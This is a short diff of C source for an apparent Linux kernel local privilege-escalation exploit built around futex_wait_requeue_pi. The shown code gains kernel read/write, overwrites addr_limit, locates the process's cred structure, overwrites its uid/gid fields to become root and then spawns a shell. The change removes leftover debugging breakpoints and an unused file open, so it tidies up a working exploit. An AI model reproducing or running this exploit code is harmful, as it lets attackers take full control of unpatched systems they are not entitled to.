@@ -131,15 +131,12 @@ void *ger(void *arg){
 	while(write(fd, (void*)(tbase+24), 8) < 0){ printf("no kernel r/w\n"); sleep(1); }
 	printf("has kernel r/w!\n");
 	write_kern((void*)(tbase+32), (void *)&new_addr_limit, 8);
-	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); // dummy call to trigger breakpoint
 	read_kern((void*)(tbase), (void *)&task_struct, 8);
 	printf("task_struct: %p\n",task_struct);
 	read_kern((void *)(task_struct+0x598), (void*)&cred, 8);
 	printf("cred: %p\n",cred);
-	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); 
 	write_kern((void *)(cred+20), (void*)&new_egideuid, 4);
 	write_kern((void *)(cred+24), (void*)&new_egideuid, 4);
-	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); 
 
 	if(geteuid() != 0) printf("not root :(\n");
 	sprintf(buf,"sh -c \"echo success %d > offset.txt && chmod 777 offset.txt && sh \"",WAITER_OVERWRITE_OFFSET);
@@ -171,7 +168,6 @@ void *prio_thread(void *prio){
 int main(int argc, char **argv){
 	pthread_t w1,l1,l2;
 	int ret,prio;
-	int fd = open("/dev/null", O_RDWR);
   	struct rt_mutex_waiter *fake_userspace_waiter,*overwrite_waiter,*kernel_waiter;	
 	
 
